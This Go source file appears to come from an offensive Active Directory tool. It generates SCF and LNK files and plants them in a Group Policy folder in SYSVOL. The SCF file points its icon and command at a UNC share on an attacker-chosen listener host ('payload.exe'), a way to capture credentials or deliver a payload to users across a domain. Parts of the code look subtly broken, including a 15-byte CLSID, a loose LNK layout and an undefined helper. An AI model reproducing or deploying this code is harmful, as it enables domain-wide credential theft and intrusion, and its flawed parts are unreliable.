package gpo

import (
	"fmt"
	"os"
	"path/filepath"
	"time"
)

type SCFConfig struct {
	Target    string
	Listener  string
	OutputDir string
}

type LNKConfig struct {
	Target    string
	Icon      string
	OutputDir string
	Comment   string
}

type SCFFile struct {
	ShellExecute string
	IconIndex    int
}

type LNKFile struct {
	CLSID          [16]byte
	Flags          uint32
	FileAttributes uint32
	CreationTime   uint64
	AccessTime     uint64
	WriteTime      uint64
	FileSize       uint32
	IconIndex      int32
	CommandFlags   uint32
	ShowCommand    uint32
	HotKey         uint16
	Reserved       [10]byte
	Name           string
	Target         string
}

func GenerateSCF(config *SCFConfig) (string, error) {
	if config.OutputDir == "" {
		config.OutputDir = "."
	}

	scfContent := fmt.Sprintf(`[Shell]
Command=2
IconFile=\\\\%s\\share\\icon.ico
CommandArgument=\\\\%s\\share\\payload.exe
[Shell\Default]
Command=2
IconFile=\\\\%s\\share\\icon.ico
CommandArgument=\\\\%s\\share\\payload.exe
`, config.Listener, config.Listener, config.Listener, config.Listener)

	filename := fmt.Sprintf("scf_%s_%d.scf", config.Target, time.Now().Unix())
	filePath := config.OutputDir + "/" + filename

	if err := os.WriteFile(filePath, []byte(scfContent), 0644); err != nil {
		return "", fmt.Errorf("write SCF file: %w", err)
	}

	return filePath, nil
}

func GenerateLNK(config *LNKConfig) (string, error) {
	if config.OutputDir == "" {
		config.OutputDir = "."
	}

	lnk := &LNKFile{
		CLSID: [16]byte{
			0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
			0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
		},
		Flags:          0x00000001,
		FileAttributes: 0x00000020,
		CreationTime:   getWindowsTime(time.Now()),
		AccessTime:     getWindowsTime(time.Now()),
		WriteTime:      getWindowsTime(time.Now()),
		IconIndex:      0,
		CommandFlags:   0x00000001,
		ShowCommand:    1,
		Name:           config.Target,
		Target:         config.Target,
	}

	data := lnk.Marshal()

	filename := fmt.Sprintf("lnk_%s_%d.lnk", config.Target, time.Now().Unix())
	filePath := config.OutputDir + "/" + filename

	if err := os.WriteFile(filePath, data, 0644); err != nil {
		return "", fmt.Errorf("write LNK file: %w", err)
	}

	return filePath, nil
}

func (l *LNKFile) Marshal() []byte {
	var buf []byte

	buf = append(buf, l.CLSID[:]...)

	buf = appendUint32LE(buf, l.Flags)
	buf = appendUint32LE(buf, l.FileAttributes)
	buf = appendUint64LE(buf, l.CreationTime)
	buf = appendUint64LE(buf, l.AccessTime)
	buf = appendUint64LE(buf, l.WriteTime)
	buf = appendUint32LE(buf, l.FileSize)
	buf = appendInt32LE(buf, l.IconIndex)
	buf = appendUint32LE(buf, l.CommandFlags)
	buf = appendUint32LE(buf, l.ShowCommand)
	buf = appendUint16LE(buf, l.HotKey)
	buf = append(buf, l.Reserved[:]...)

	nameBytes := []byte(l.Name)
	buf = appendUint16LE(buf, uint16(len(nameBytes)))
	buf = append(buf, nameBytes...)
	buf = append(buf, 0)

	targetBytes := []byte(l.Target)
	buf = appendUint16LE(buf, uint16(len(targetBytes)))
	buf = append(buf, targetBytes...)
	buf = append(buf, 0)

	return buf
}

func getWindowsTime(t time.Time) uint64 {
	epoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	return uint64(t.Sub(epoch).Nanoseconds() / 100)
}

func appendUint16LE(buf []byte, v uint16) []byte {
	return append(buf, byte(v), byte(v>>8))
}

func appendUint32LE(buf []byte, v uint32) []byte {
	return append(buf, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func appendUint64LE(buf []byte, v uint64) []byte {
	return append(buf, byte(v), byte(v>>8), byte(v>>16), byte(v>>24),
		byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56))
}

func appendInt32LE(buf []byte, v int32) []byte {
	return appendUint32LE(buf, uint32(v))
}

func DeploySCFViaGPO(gpoGUID, sysvolPath, listenerIP, target string) (string, error) {
	config := &SCFConfig{
		Target:   target,
		Listener: listenerIP,
	}

	scfPath, err := GenerateSCF(config)
	if err != nil {
		return "", fmt.Errorf("generate SCF: %w", err)
	}

	gpoPath := findGPOPath(gpoGUID, sysvolPath)
	if gpoPath == "" {
		return "", fmt.Errorf("GPO path not found for GUID: %s", gpoGUID)
	}

	fileDir := filepath.Join(gpoPath, "Machine", "Files")
	if err := os.MkdirAll(fileDir, 0755); err != nil {
		return "", fmt.Errorf("create files dir: %w", err)
	}

	scfData, err := os.ReadFile(scfPath)
	if err != nil {
		return "", fmt.Errorf("read SCF: %w", err)
	}

	destFile := filepath.Join(fileDir, filepath.Base(scfPath))
	if err := os.WriteFile(destFile, scfData, 0644); err != nil {
		return "", fmt.Errorf("write SCF to SYSVOL: %w", err)
	}

	return destFile, nil
}

func DeployLNKViaGPO(gpoGUID, sysvolPath, target, icon, comment string) (string, error) {
	config := &LNKConfig{
		Target:  target,
		Icon:    icon,
		Comment: comment,
	}

	lnkPath, err := GenerateLNK(config)
	if err != nil {
		return "", fmt.Errorf("generate LNK: %w", err)
	}

	gpoPath := findGPOPath(gpoGUID, sysvolPath)
	if gpoPath == "" {
		return "", fmt.Errorf("GPO path not found for GUID: %s", gpoGUID)
	}

	fileDir := filepath.Join(gpoPath, "Machine", "Files")
	if err := os.MkdirAll(fileDir, 0755); err != nil {
		return "", fmt.Errorf("create files dir: %w", err)
	}

	lnkData, err := os.ReadFile(lnkPath)
	if err != nil {
		return "", fmt.Errorf("read LNK: %w", err)
	}

	destFile := filepath.Join(fileDir, filepath.Base(lnkPath))
	if err := os.WriteFile(destFile, lnkData, 0644); err != nil {
		return "", fmt.Errorf("write LNK to SYSVOL: %w", err)
	}

	return destFile, nil
}


